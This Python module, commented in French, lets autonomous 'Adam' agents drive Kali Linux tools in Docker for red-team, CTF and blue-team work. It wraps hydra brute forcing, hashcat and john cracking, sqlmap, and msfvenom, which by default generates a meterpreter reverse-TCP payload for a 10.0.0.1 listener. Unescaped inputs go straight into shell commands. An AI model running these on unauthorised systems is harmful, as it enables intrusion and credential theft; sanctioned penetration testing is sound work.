#!/usr/bin/env python3
"""
Kali Tools Bridge — Interface pour les Adams.

Permet aux agents Adam d'utiliser les outils Kali Linux via le conteneur Docker
`kali-pentest` pour leurs missions de sécurité offensive (adam-red), de forensic
(adam-ctf) et de défense (adam-blue).

Utilisation:
    from kali_bridge import KaliBridge
    kb = KaliBridge()
    result = kb.nmap_scan("192.168.1.0/24", args="-sV")
    result = kb.john_crack("/opt/wordlists/leaked/rockyou.txt", hash_file="/tmp/hashes.txt")
    result = kb.hashcat_crack("5d41402abc4b2a76b9719d911017c592", wordlist="/opt/wordlists/leaked/rockyou.txt")
    result = kb.msfconsole_run("use exploit/multi/handler; set LHOST 10.0.0.1; exploit")
    result = kb.hydra_brute("192.168.1.5", "ssh", "/opt/wordlists/leaked/top10k_common.txt")
    result = kb.tshark_capture("eth0", duration=10, filter="port 80")
    result = kb.gdb_analyze("/tmp/binary")
    result = kb.radare2_analyze("/tmp/binary")
    result = kb.binwalk_extract("/tmp/firmware.bin")
    result = kb.sqlmap_scan("http://target/page?id=1")
    result = kb.nikto_scan("http://target")
    result = kb.gobuster_dir("http://target", "/opt/wordlists/dictionaries/google_top10k.txt")
"""

import subprocess
import json
import os
import tempfile
import time
from typing import Optional


class KaliBridge:
    """Pont entre les agents Adam et le conteneur Kali Linux Docker."""

    def __init__(self, container_name: str = "kali-pentest", timeout: int = 120):
        self.container = container_name
        self.timeout = timeout
        self.wordlists_dir = "/opt/wordlists"

    def _exec(self, command: str, timeout: Optional[int] = None) -> dict:
        """Exécute une commande dans le conteneur Kali."""
        t = timeout or self.timeout
        try:
            result = subprocess.run(
                ["docker", "exec", self.container, "bash", "-c", command],
                capture_output=True,
                text=True,
                timeout=t,
            )
            return {
                "success": result.returncode == 0,
                "exit_code": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "command": command,
            }
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "exit_code": -1,
                "stdout": "",
                "stderr": f"Timeout après {t}s",
                "command": command,
            }
        except Exception as e:
            return {
                "success": False,
                "exit_code": -2,
                "stdout": "",
                "stderr": str(e),
                "command": command,
            }

    def _exec_interactive(self, commands: list[str], timeout: int = 120) -> dict:
        """Exécute des commandes interactives via stdin (pour msfconsole, etc.)."""
        try:
            script = "\n".join(commands) + "\nexit\n"
            result = subprocess.run(
                ["docker", "exec", "-i", self.container, "bash", "-c", "cat | bash"],
                input=script,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            return {
                "success": result.returncode == 0,
                "exit_code": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "commands": commands,
            }
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "exit_code": -1,
                "stdout": "",
                "stderr": f"Timeout après {timeout}s",
                "commands": commands,
            }
        except Exception as e:
            return {
                "success": False,
                "exit_code": -2,
                "stdout": "",
                "stderr": str(e),
                "commands": commands,
            }

    # ─── Reconnaissance réseau ───

    def nmap_scan(self, target: str, args: str = "-sV") -> dict:
        """Scan Nmap avec arguments personnalisés."""
        cmd = f"nmap {args} {target} 2>&1"
        return self._exec(cmd, timeout=300)

    def masscan_scan(self, target: str, ports: str = "1-65535", rate: int = 1000) -> dict:
        """Scan Masscan ultra-rapide."""
        cmd = f"masscan {target} -p{ports} --rate {rate} 2>&1"
        return self._exec(cmd, timeout=300)

    def whatweb_scan(self, url: str) -> dict:
        """Identification des technologies web."""
        cmd = f"whatweb {url} 2>&1"
        return self._exec(cmd, timeout=60)

    # ─── Crackage de mots de passe ───

    def john_crack(
        self,
        hash_file: str,
        wordlist: Optional[str] = None,
        format: Optional[str] = None,
        rules: bool = True,
    ) -> dict:
        """
        Crackage de hashes avec John the Ripper.
        hash_file: fichier contenant les hashes à crackes
        wordlist: dictionnaire à utiliser (défaut: rockyou)
        format: format de hash (md5, sha1, etc.)
        """
        wl = wordlist or f"{self.wordlists_dir}/leaked/rockyou.txt"
        fmt = f"--format={format}" if format else ""
        rules_arg = "--rules" if rules else ""
        cmd = f"john {fmt} --wordlist={wl} {rules_arg} {hash_file} 2>&1"
        result = self._exec(cmd, timeout=300)
        # Récupérer les résultats
        if result["success"] or result["stdout"]:
            show = self._exec(f"john --show {hash_file} 2>&1")
            result["cracked"] = show.get("stdout", "")
        return result

    def hashcat_crack(
        self,
        target: str,
        mode: int = 0,  # 0=MD5, 100=SHA1, 1400=SHA256
        wordlist: Optional[str] = None,
        rules_file: Optional[str] = None,
    ) -> dict:
        """
        Crackage de hashes avec Hashcat.
        target: hash ou fichier de hashes
        mode: 0=MD5, 100=SHA1, 1400=SHA256, 1000=NTLM, 1800=sha512crypt
        """
        wl = wordlist or f"{self.wordlists_dir}/leaked/rockyou.txt"
        # Si target ressemble à un hash, le mettre dans un fichier temp
        if len(target) < 256 and "\n" not in target and os.path.exists(target) is False:
            tmp = tempfile.mktemp(suffix=".hash")
            self._exec(f"echo '{target}' > {tmp}")
            target = tmp

        rules_arg = f"-r {rules_file}" if rules_file else ""
        cmd = f"hashcat -m {mode} {target} {wl} {rules_arg} --force 2>&1"
        result = self._exec(cmd, timeout=300)
        # Afficher les résultats
        if result["success"] or "Cracked" in result.get("stdout", ""):
            show = self._exec(f"hashcat -m {mode} {target} --show 2>&1")
            result["cracked"] = show.get("stdout", "")
        return result

    def rainbow_crack(self, hash_str: str, algo: str = "md5") -> dict:
        """Crackage via rainbow table (notre outil custom)."""
        cmd = f"python3 {self.wordlists_dir}/rainbow_tool.py --crack {hash_str} --algo {algo} 2>&1"
        return self._exec(cmd, timeout=60)

    def hydra_brute(
        self,
        target: str,
        service: str,
        wordlist: str,
        user: str = "admin",
        extra_args: str = "",
    ) -> dict:
        """Brute force de service avec Hydra."""
        cmd = f"hydra -l '{user}' -P '{wordlist}' {extra_args} {target} {service} 2>&1"
        return self._exec(cmd, timeout=300)

    # ─── Metasploit ───

    def msfconsole_run(self, resource_file: str, timeout: int = 120) -> dict:
        """
        Exécute un script de ressources Metasploit.
        Créer le fichier .rc avec les commandes msfconsole puis appeler cette méthode.
        """
        cmd = f"msfconsole -r {resource_file} -q 2>&1"
        return self._exec(cmd, timeout=timeout)

    def msfvenom_generate(
        self,
        payload: str = "windows/meterpreter/reverse_tcp",
        lhost: str = "10.0.0.1",
        lport: int = 4444,
        format: str = "raw",
        output: str = "/tmp/payload.bin",
        extra: str = "",
    ) -> dict:
        """Génère un payload avec msfvenom."""
        cmd = (
            f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
            f"-f {format} -o {output} {extra} 2>&1"
        )
        return self._exec(cmd, timeout=60)

    # ─── Capture & analyse réseau ───

    def tshark_capture(
        self,
        interface: str = "eth0",
        duration: int = 10,
        filter: str = "",
        output_file: Optional[str] = None,
    ) -> dict:
        """Capture de trafic avec tshark."""
        outfile = output_file or f"/tmp/capture_{int(time.time())}.pcap"
        filter_arg = f"-f '{filter}'" if filter else ""
        cmd = f"timeout {duration} tshark -i {interface} {filter_arg} -w {outfile} 2>&1"
        result = self._exec(cmd, timeout=duration + 10)
        result["pcap_file"] = outfile
        return result

    def tshark_read(self, pcap_file: str, filter: str = "") -> dict:
        """Lit un fichier pcap avec tshark."""
        filter_arg = f"-Y '{filter}'" if filter else ""
        cmd = f"tshark -r {pcap_file} {filter_arg} 2>&1 | head -100"
        return self._exec(cmd, timeout=30)

    def tcpdump_capture(
        self,
        interface: str = "eth0",
        duration: int = 10,
        filter: str = "",
        output_file: Optional[str] = None,
    ) -> dict:
        """Capture avec tcpdump."""
        outfile = output_file or f"/tmp/capture_{int(time.time())}.pcap"
        filter_arg = filter if filter else ""
        cmd = f"timeout {duration} tcpdump -i {interface} -w {outfile} {filter_arg} 2>&1"
        result = self._exec(cmd, timeout=duration + 10)
        result["pcap_file"] = outfile
        return result

    # ─── Reverse engineering ───

    def gdb_analyze(self, binary: str, commands: Optional[list[str]] = None) -> dict:
        """Analyse un binaire avec GDB."""
        cmds = commands or ["info functions", "disas main", "checksec"]
        gdb_script = "\n".join(cmds)
        tmp_script = "/tmp/gdb_commands.txt"
        self._exec(f"cat > {tmp_script} << 'GDBEOF'\n{gdb_script}\nGDBEOF")
        cmd = f"gdb -batch -x {tmp_script} {binary} 2>&1"
        return self._exec(cmd, timeout=60)

    def radare2_analyze(self, binary: str, commands: Optional[list[str]] = None) -> dict:
        """Analyse un binaire avec radare2."""
        cmds = commands or ["aaa", "afl", "pdf @main"]
        cmd_str = "; ".join(cmds)
        cmd = f"r2 -q -c '{cmd_str}' {binary} 2>&1"
        return self._exec(cmd, timeout=60)

    def binwalk_extract(self, firmware: str, extract: bool = True) -> dict:
        """Analyse/extrait un firmware avec binwalk."""
        flag = "-e" if extract else ""
        cmd = f"binwalk {flag} {firmware} 2>&1"
        return self._exec(cmd, timeout=60)

    def strings_extract(self, binary: str, min_len: int = 4, encoding: str = "") -> dict:
        """Extrait les strings d'un binaire."""
        enc = f"-e {encoding}" if encoding else ""
        cmd = f"strings -n {min_len} {enc} {binary} 2>&1 | head -200"
        return self._exec(cmd, timeout=30)

    # ─── Web pentest ───

    def sqlmap_scan(self, url: str, args: str = "--batch --level=3 --risk=2") -> dict:
        """Scan SQL injection avec sqlmap."""
        cmd = f"sqlmap -u '{url}' {args} 2>&1 | tail -50"
        return self._exec(cmd, timeout=300)

    def nikto_scan(self, target: str, args: str = "") -> dict:
        """Scan de vulnérabilités web avec nikto."""
        cmd = f"nikto -h {target} {args} 2>&1 | tail -50"
        return self._exec(cmd, timeout=300)

    def gobuster_dir(
        self,
        url: str,
        wordlist: str,
        extensions: str = ".php,.html,.txt,.bak",
        threads: int = 50,
    ) -> dict:
        """Énumération de répertoires avec gobuster."""
        ext = f"-x {extensions}" if extensions else ""
        cmd = f"gobuster dir -u {url} -w {wordlist} {ext} -t {threads} 2>&1 | tail -50"
        return self._exec(cmd, timeout=300)

    def nuclei_scan(self, target: str, templates: str = "") -> dict:
        """Scan de vulnérabilités avec nuclei."""
        tmpl = f"-t {templates}" if templates else ""
        cmd = f"nuclei -u {target} {tmpl} 2>&1 | tail -50"
        return self._exec(cmd, timeout=300)

    # ─── Forensic ───

    def foremost_extract(self, image: str, output_dir: str = "/tmp/foremost_out") -> dict:
        """Récupération de fichiers avec foremost."""
        cmd = f"foremost -i {image} -o {output_dir} 2>&1"
        return self._exec(cmd, timeout=120)

    def volatility_analyze(
        self, memory_dump: str, profile: str = "", plugin: str = "pslist"
    ) -> dict:
        """Analyse de dump mémoire avec Volatility 3."""
        cmd = f"volatility3 -f {memory_dump} {plugin} 2>&1 | head -100"
        return self._exec(cmd, timeout=120)

    def sleuthkit_mmls(self, image: str) -> dict:
        """Liste les partitions d'une image avec sleuthkit."""
        cmd = f"mmls {image} 2>&1"
        return self._exec(cmd, timeout=30)

    def sleuthkit_fls(self, image: str, partition: str = "") -> dict:
        """Liste les fichiers d'une image avec sleuthkit."""
        part = f"-o {partition}" if partition else ""
        cmd = f"fls {part} {image} 2>&1 | head -100"
        return self._exec(cmd, timeout=30)

    # ─── Utilitaires ───

    def hashid_identify(self, hash_str: str) -> dict:
        """Identifie le type d'un hash."""
        cmd = f"hashid '{hash_str}' 2>&1"
        return self._exec(cmd, timeout=10)

    def crunch_generate(
        self, min_len: int, max_len: int, charset: str = "abcdefghijklmnopqrstuvwxyz0123456789"
    ) -> dict:
        """Génère une wordlist avec crunch."""
        cmd = f"crunch {min_len} {max_len} '{charset}' 2>&1 | head -1000"
        return self._exec(cmd, timeout=30)

    def cewl_words(self, url: str, depth: int = 2, min_len: int = 5) -> dict:
        """Génère une wordlist depuis un site avec cewl."""
        cmd = f"cewl -d {depth} -m {min_len} {url} 2>&1"
        return self._exec(cmd, timeout=60)

    def searchsploit(self, query: str) -> dict:
        """Recherche d'exploits dans exploitdb."""
        cmd = f"searchsploit {query} 2>&1"
        return self._exec(cmd, timeout=30)

    def list_available_tools(self) -> dict:
        """Liste tous les outils disponibles dans le conteneur Kali."""
        tools = [
            "nmap", "masscan", "john", "hashcat", "hydra", "sqlmap", "nikto",
            "gobuster", "whatweb", "metasploit-framework", "msfconsole", "msfvenom",
            "tshark", "tcpdump", "gdb", "radare2", "binwalk", "crunch", "cewl",
            "netcat", "ncat", "socat", "sshpass", "hashid", "hash-identifier",
            "foremost", "sleuthkit", "mmls", "fls", "volatility3", "nuclei",
            "httpx", "subfinder", "amass", "aircrack-ng", "responder",
            "crackmapexec", "netexec", "impacket-smbclient", "searchsploit",
            "openssl", "strings", "file", "curl", "python3",
        ]
        available = []
        for tool in tools:
            check = self._exec(f"command -v {tool} 2>/dev/null", timeout=5)
            if check["success"] and check["stdout"].strip():
                available.append(tool)
        return {
            "success": True,
            "available_tools": available,
            "total": len(available),
            "container": self.container,
        }

    def health_check(self) -> dict:
        """Vérifie l'état du conteneur Kali."""
        check = self._exec("echo OK && whoami && uname -a", timeout=5)
        return {
            "container_running": check["success"],
            "user": check.get("stdout", "").strip(),
            "kernel": check.get("stdout", ""),
            "container": self.container,
        }


if __name__ == "__main__":
    import sys

    kb = KaliBridge()

    if len(sys.argv) < 2:
        print("Usage: kali_bridge.py <command> [args...]")
        print("Commands: health, tools, nmap, john, hashcat, hydra, tshark, gdb, r2, binwalk, sqlmap, nikto, gobuster")
        sys.exit(1)

    cmd = sys.argv[1]

    if cmd == "health":
        result = kb.health_check()
        print(json.dumps(result, indent=2))

    elif cmd == "tools":
        result = kb.list_available_tools()
        print(json.dumps(result, indent=2))

    elif cmd == "nmap" and len(sys.argv) > 2:
        target = sys.argv[2]
        args = sys.argv[3] if len(sys.argv) > 3 else "-sV"
        result = kb.nmap_scan(target, args)
        print(result["stdout"])

    elif cmd == "john" and len(sys.argv) > 2:
        hash_file = sys.argv[2]
        wordlist = sys.argv[3] if len(sys.argv) > 3 else None
        result = kb.john_crack(hash_file, wordlist)
        print(result.get("stdout", ""))
        if result.get("cracked"):
            print("--- CRACKED ---")
            print(result["cracked"])

    elif cmd == "hashcat" and len(sys.argv) > 2:
        target = sys.argv[2]
        mode = int(sys.argv[3]) if len(sys.argv) > 3 else 0
        result = kb.hashcat_crack(target, mode)
        print(result.get("stdout", ""))
        if result.get("cracked"):
            print("--- CRACKED ---")
            print(result["cracked"])

    elif cmd == "rainbow" and len(sys.argv) > 2:
        hash_str = sys.argv[2]
        algo = sys.argv[3] if len(sys.argv) > 3 else "md5"
        result = kb.rainbow_crack(hash_str, algo)
        print(result.get("stdout", ""))

    elif cmd == "tshark" and len(sys.argv) > 2:
        interface = sys.argv[2]
        duration = int(sys.argv[3]) if len(sys.argv) > 3 else 10
        result = kb.tshark_capture(interface, duration)
        print(json.dumps(result, indent=2))

    elif cmd == "gdb" and len(sys.argv) > 2:
        binary = sys.argv[2]
        result = kb.gdb_analyze(binary)
        print(result.get("stdout", ""))

    elif cmd == "r2" and len(sys.argv) > 2:
        binary = sys.argv[2]
        result = kb.radare2_analyze(binary)
        print(result.get("stdout", ""))

    elif cmd == "binwalk" and len(sys.argv) > 2:
        firmware = sys.argv[2]
        result = kb.binwalk_extract(firmware)
        print(result.get("stdout", ""))

    elif cmd == "sqlmap" and len(sys.argv) > 2:
        url = sys.argv[2]
        result = kb.sqlmap_scan(url)
        print(result.get("stdout", ""))

    elif cmd == "nikto" and len(sys.argv) > 2:
        target = sys.argv[2]
        result = kb.nikto_scan(target)
        print(result.get("stdout", ""))

    elif cmd == "gobuster" and len(sys.argv) > 2:
        url = sys.argv[2]
        wordlist = sys.argv[3] if len(sys.argv) > 3 else f"{kb.wordlists_dir}/dictionaries/google_top10k.txt"
        result = kb.gobuster_dir(url, wordlist)
        print(result.get("stdout", ""))

    elif cmd == "searchsploit" and len(sys.argv) > 2:
        query = " ".join(sys.argv[2:])
        result = kb.searchsploit(query)
        print(result.get("stdout", ""))

    else:
        print(f"Commande inconnue: {cmd}")
        sys.exit(1)
